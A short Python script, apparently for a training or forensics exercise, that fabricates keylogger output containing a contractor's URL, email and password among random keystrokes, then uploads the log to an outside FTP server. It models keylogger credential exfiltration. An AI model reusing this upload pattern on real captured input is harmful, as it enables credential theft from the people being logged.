import ftplib
from string import ascii_lowercase, ascii_uppercase
from random import random, randint

# constants
ALPHA_KEYS = list(ascii_lowercase)
ALPHA_SHIFT_KEYS = list(ascii_uppercase)
NUMERIC_KEYS = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
NUMERIC_SHIFT_KEYS = [")", "!", "@", "#", "$", "%", "^", "&", "*", "("]
SYMBOL_KEYS = ["-", "=", "`", "[", "]", ";", "'", "\\", ",", ".", "/"]
SYMBOL_SHIFT_KEYS = ["_", "+", "~", "{", "}", ":", "\"", "|", "<", ">", "?"]
ARROW_KEYS = ["[uparrow]", "[downarrow]", "[leftarrow]", "[rightarrow]"]
FUNC_KEYS = ["[esc]", "[shift]", "[backspace]", "[control]", "[enter]", "[tab]", "[capslock]", "[space]"]
NON_SHIFT_KEYS = ALPHA_KEYS + NUMERIC_KEYS + SYMBOL_KEYS
SHIFT_KEYS = ALPHA_SHIFT_KEYS + NUMERIC_SHIFT_KEYS + SYMBOL_SHIFT_KEYS
SUB_KEYS = NON_SHIFT_KEYS + SHIFT_KEYS
KEYS = SUB_KEYS + ARROW_KEYS + FUNC_KEYS

# global
url = "web.fazio.com"
email = "contractor@fazio.com"
pswd = "password"
backspace_prob = 0.01
shift_prob = 0.05

# randomly insert backspaces
def backspace(text, prob):
  new = ""
  for n in range(len(text)):
    if random() < prob:
      new += SUB_KEYS[randint(0, len(SUB_KEYS)-1)]
      new += "[backspace]"
    new += text[n]
  return new

# convert shifted keys
def shift(text):
  new = ""
  for n in range(len(text)):
    try:
      index = SHIFT_KEYS.index(text[n])
    except ValueError:
      index = -1
    if index != -1:
      new += "[shift]"
      new += NON_SHIFT_KEYS[index]
    else:
      new += text[n]
  return new

# create random garble text
def garble(size):
  text = ""
  for n in range(size):
    if random() < shift_prob:
      text += SHIFT_KEYS[randint(0, len(SHIFT_KEYS)-1)]
    else:
      text += NON_SHIFT_KEYS[randint(0, len(NON_SHIFT_KEYS)-1)]
  return(shift(backspace(text, backspace_prob)))

def main():
  f = open("logs.txt", "a+")
  f.write(garble(1000))
  f.write(shift(backspace(url, backspace_prob)) + "[enter]")
  f.write(shift(backspace(email, backspace_prob)) + "[tab]")
  f.write(shift(backspace(pswd, backspace_prob)) + "[enter]")
  f.write(garble(1000))
  f.close()

  host = "ftp.fazio.com"
  port = 21
  username = "anonymous"
  password = "contractor@fazio.com"
  ftp = ftplib.FTP(host, username, password)
  ftp.connect(host, port)
  ftp.login()
  ftp.cwd("upload")
  ftp.storbinary("STOR logs.txt", open("logs.txt", "rb"))
  ftp.close()

if __name__ == "__main__":
  main()